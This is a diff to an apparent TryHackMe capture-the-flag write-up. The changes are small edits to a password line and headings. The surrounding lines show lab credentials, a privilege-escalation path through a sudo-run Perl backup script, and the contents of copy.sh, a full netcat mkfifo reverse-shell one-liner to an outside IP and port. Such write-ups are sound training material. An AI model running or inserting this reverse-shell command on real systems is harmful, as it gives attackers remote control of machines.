@@ -130,7 +130,7 @@ Session completed.
 
 Let's login using http://10.10.29.138/content/as/
 user: manager
-password; password1
+password: Password123
 
 **We're logged in as www-root**
 
@@ -177,7 +177,7 @@ User www-data may run the following commands on THM-Chal:
 ```bash
 cat /home/itguy/backup.pl
 ```
-**results**
+**Results for backup.pl**
 ```
 #!/usr/bin/perl
 
@@ -185,7 +185,7 @@ system("sh", "/etc/copy.sh");
 ```
 *I don't heve permissions to edit this file. Maybe I'll have better luck with copy.sh
 
-**results for copy.sh**
+**Results for copy.sh**
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 ```
